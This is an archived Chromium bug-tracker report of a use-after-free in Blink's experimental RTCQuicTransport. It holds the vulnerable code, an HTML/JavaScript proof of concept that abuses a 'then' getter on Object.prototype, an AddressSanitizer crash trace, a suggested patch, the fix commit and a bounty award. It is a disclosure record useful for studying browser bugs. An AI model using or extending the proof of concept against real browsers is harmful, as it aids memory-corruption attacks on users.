# Security: UAF in RTCQuicTransport due to iterator invalidation

| Field | Value |
|-------|-------|
| **Issue ID** | [40052913](https://issues.chromium.org/issues/40052913) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebRTC |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | tj...@theori.io |
| **Assignee** | st...@chromium.org |
| **Created** | 2020-07-22 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**

Promises in JavaScript are not resolved synchronously; a microtask is posted to run the callback. But according to the spec for promise resolution (<https://tc39.es/ecma262/#sec-promise-resolve-functions>), when |resolution| is an object, |Get(resolution, "then")| will be called. So If user script defines a getter for "then" in the Object prototype, the getter will run synchronously any time a promise is resolved with an object.

ScriptPromise RTCQuicTransport::getStats(ScriptState\* script\_state,  

ExceptionState& exception\_state) {  

...  

uint32\_t request\_id = ++get\_stats\_id\_counter\_;  

stats\_promise\_map\_.Set(request\_id, promise\_resolver); // adds a new element to the map  

...  

}

void RTCQuicTransport::OnStats(uint32\_t request\_id,  

const P2PQuicTransportStats& stats) {  

auto it = stats\_promise\_map\_.find(request\_id);  

DCHECK(it != stats\_promise\_map\_.end());  

RTCQuicTransportStats\* rtc\_stats = CreateRTCQuicTransportStats(stats);  

rtc\_stats->setNumReceivedDatagramsDropped(num\_dropped\_received\_datagrams\_);  

it->value->Resolve(rtc\_stats); // can run user script  

stats\_promise\_map\_.erase(it); // iterator may now be invalid  

}

During the resolution, user script can add new elements to |stats\_promise\_map\_|, causing the map's backing to be reallocated. This frees the buffer underlying |it|, but |it| is then deleted from the map.

**VERSION**  

All recent versions, but requires the experiment quic features enabled, e.g. --enable-blink-features=RTCQuicTransport

**REPRODUCTION CASE**

<html>
<head>
<script>
t = new RTCQuicTransport(new RTCIceTransport());
t.connect('localhost');
t.getStats();
var count = 0;
Object.defineProperty(Object.prototype, "then", { get() {
if (!count++) {
for (var i = 0; i < 4; i++) t.getStats();
}
}});
</script>
</head>
</html>

PATCH

Rather than passing the iterator to erase, the key can be passed, e.g.

it->value->Resolve(rtc\_stats);  

stats\_promise\_map\_.erase(request\_id);

**CREDIT INFORMATION**  

Reporter credit: Tim Becker of Theori

## Timeline

### aj...@google.com (2020-07-22)

Thanks for the report and POC. I'm having difficulty reproducing on HEAD as I'm hitting quic DCHECKS however your explanation is compelling.

CC'd relevant OWNERS. Please take a look.

[Monorail components: Blink>WebRTC]

### cl...@chromium.org (2020-07-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4836845279576064.

### ad...@google.com (2020-07-22)

I have tried feeding this to ClusterFuzz here:
https://clusterfuzz.com/testcase-detail/5680212943110144

I entered the wrong crbug ID (*facepalm*) so no updates will be appended to this bug.

I'm not sure whether it'll work on CF anyway due to the connection to localhost.

### ad...@google.com (2020-07-22)

Aha, we raced anyway :)

### aj...@google.com (2020-07-24)

CF has confirmed this. Steve, could you take a look for find someone to investigate and fix?

==1==ERROR: AddressSanitizer: use-after-poison on address 0x7ecbee40d270 at pc 0x558dc0f45647 bp 0x7ffd8309d110 sp 0x7ffd8309d108
WRITE of size 4 at 0x7ecbee40d270 thread T0 (chrome)
SCARINESS: 46 (4-byte-write-use-after-poison)
    #0 0x558dc0f45646 in ConstructDeletedValue third_party/blink/renderer/platform/wtf/hash_traits.h:124:10
    #1 0x558dc0f45646 in ConstructDeletedValue third_party/blink/renderer/platform/wtf/hash_traits.h:468:5
    #2 0x558dc0f45646 in DeleteBucket third_party/blink/renderer/platform/wtf/hash_table.h:928:5
    #3 0x558dc0f45646 in WTF::HashTable<unsigned int, WTF::KeyValuePair<unsigned int, blink::Member<blink::ScriptPromiseResolver> >, WTF::KeyValuePairKeyExtractor, WTF::IntHash<unsigned int>, WTF::HashMapValueTraits<WTF::HashTraits<unsigned int>, WTF::HashTraits<blink::Member<blink::ScriptPromiseResolver> > >, WTF::HashTraits<unsigned int>, blink::HeapAllocator>::erase(WTF::KeyValuePair<unsigned int, blink::Member<blink::ScriptPromiseResolver> > const*) third_party/blink/renderer/platform/wtf/hash_table.h:1585:3
    #4 0x558dc0f3a4d7 in erase third_party/blink/renderer/platform/wtf/hash_table.h:1606:3
    #5 0x558dc0f3a4d7 in erase third_party/blink/renderer/platform/wtf/hash_map.h:633:9
    #6 0x558dc0f3a4d7 in blink::RTCQuicTransport::OnStats(unsigned int, blink::P2PQuicTransportStats const&) third_party/blink/renderer/modules/peerconnection/rtc_quic_transport.cc:541:22
    #7 0x558db0390a12 in Run base/callback.h:98:12
    #8 0x558db0390a12 in base::TaskAnnotator::RunTask(char const*, base::PendingTask*) base/task/common/task_annotator.cc:142:33
    #9 0x558db03cb118 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence_manager::LazyNow*, bool*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:324:23
    #10 0x558db03caa37 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:248:7
    #11 0x558db02c9df0 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:39:55
    #12 0x558db03cc368 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:429:12
    #13 0x558db0341cda in base::RunLoop::Run() base/run_loop.cc:124:14
    #14 0x558dc13d56d6 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer_main.cc:226:16
    #15 0x558daf2b06ef in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:495:14
    #16 0x558daf2b3bdc in content::ContentMainRunnerImpl::Run(bool) content/app/content_main_runner_impl.cc:882:10
    #17 0x558daf4447a9 in service_manager::Main(service_manager::MainParams const&) services/service_manager/embedder/main.cc:454:29
    #18 0x558daf2aeb3f in content::ContentMain(content::ContentMainParams const&) content/app/content_main.cc:19:10
    #19 0x558da5ccc4a3 in ChromeMain chrome/app/chrome_main.cc:110:12
    #20 0x7f59609e582f in __libc_start_main /build/glibc-LK5gWL/glibc-2.23/csu/libc-start.c:291
Address 0x7ecbee40d270 is a wild pointer.
SUMMARY: AddressSanitizer: use-after-poison (/mnt/scratch0/clusterfuzz/bot/builds/chromium-browser-asan_linux-release_eb660d5ee526c9c1c1608a71fcbe7a713c490533/stable/asan-linux-stable-83.0.4103.116/chrome+0x24553646)
Shadow bytes around the buggy address:
  0x0fd9fdc799f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fd9fdc79a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fd9fdc79a10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fd9fdc79a20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fd9fdc79a30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0fd9fdc79a40: 00 00 00 00 00 00 00 00 00 00 00 00 00 f7[f7]f7
  0x0fd9fdc79a50: f7 f7 f7 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fd9fdc79a60: 00 00 00 f7 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fd9fdc79a70: f7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fd9fdc79a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fd9fdc79a90: 00 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==1==ABORTING

### [Deleted User] (2020-07-24)

[Empty comment from Monorail migration]

### aj...@google.com (2020-07-27)

Gengtle sheriff ping. Any progress?

### st...@chromium.org (2020-07-28)

https://chromium-review.googlesource.com/c/chromium/src/+/2321847 out for review

### hb...@chromium.org (2020-07-28)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/46f54a0488e4f454922e8d3067922dda81b9c547

commit 46f54a0488e4f454922e8d3067922dda81b9c547
Author: Steve Anton <steveanton@chromium.org>
Date: Tue Jul 28 08:55:13 2020

[RTCQuicTransport] Defer promise resolution to the end of async tasks to avoid re-entrancy

Bug: 1108472
Change-Id: Ifd5c26736460b3c9f615f99a5abaf909a81b6618
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2321847
Auto-Submit: Steve Anton <steveanton@chromium.org>
Commit-Queue: Henrik Boström <hbos@chromium.org>
Reviewed-by: Henrik Boström <hbos@chromium.org>
Cr-Commit-Position: refs/heads/master@{#792185}

[modify] https://crrev.com/46f54a0488e4f454922e8d3067922dda81b9c547/third_party/blink/renderer/modules/peerconnection/rtc_quic_transport.cc


### st...@chromium.org (2020-07-28)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-28)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-03)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-05)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-08-05)

... and the VRP panel decided to award $7,500 for this report as well. Congratulations!

### sh...@chromium.org (2020-08-06)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-06)

[Empty comment from Monorail migration]

### mm...@chromium.org (2020-09-29)

steveanton@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### to...@chromium.org (2020-09-29)

[Empty comment from Monorail migration]

### mm...@chromium.org (2020-10-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-11-03)

This issue was migrated from crbug.com/chromium/1108472?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052913)*
